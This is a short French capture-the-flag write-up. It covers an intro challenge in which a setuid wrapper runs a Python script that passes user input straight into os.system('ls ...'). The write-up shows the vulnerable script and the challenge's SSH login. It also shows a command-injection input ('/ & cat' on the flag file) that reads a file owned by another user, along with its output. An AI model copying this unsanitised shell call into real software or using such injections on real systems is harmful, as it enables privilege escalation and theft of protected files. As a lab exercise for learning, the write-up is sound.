Votre but est d'exploiter le binaire (en exécutant ./wrapper), n'oubliez pas de lire le fichier chall.py, qui est le programme exécuté par ./wrapper.

Le flag est situé ici : /home/r00t/flag/flag.txt

Nom d'utilisateur : jail
Mot de passe : jail
ssh -p 4444 jail@intro.ctfrei.fr 

-------------------------------------------------------
#!/usr/bin/python3
import os

print("Rentre en input un directory que tu veux ls !")
s = input("ls ")
os.system(f'ls {s}')
-------------------------------------------------------

On constate que wrapper appartient à r00t et qu'on peu l'executer.
```
jail@c8ca7891ea87:~$ ls -la
total 32
drwxr-xr-x 1 root root  4096 Sep 19 14:00 .
drwxr-xr-x 1 root root  4096 Sep 19 14:00 ..
-rwxr-xr-x 1 root root   123 Sep 12 13:25 chall.py
-rwsr-xr-x 1 r00t r00t 16056 Sep 19 14:00 wrapper
```

On peut manipuler l'input de python pour executer les commandes que l'on veut :
```
os.system(f'ls {s}')
```
```
jail@c8ca7891ea87:~$ ./wrapper 
Rentre en input un directory que tu veux ls !
ls / & cat /home/r00t/flag/flag.txt
CTFREI{3a5y_b1n4ry_3xpl0it}
bin   dev  home  lib32	libx32	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 lib64	media	opt  root  sbin  sys  usr
```
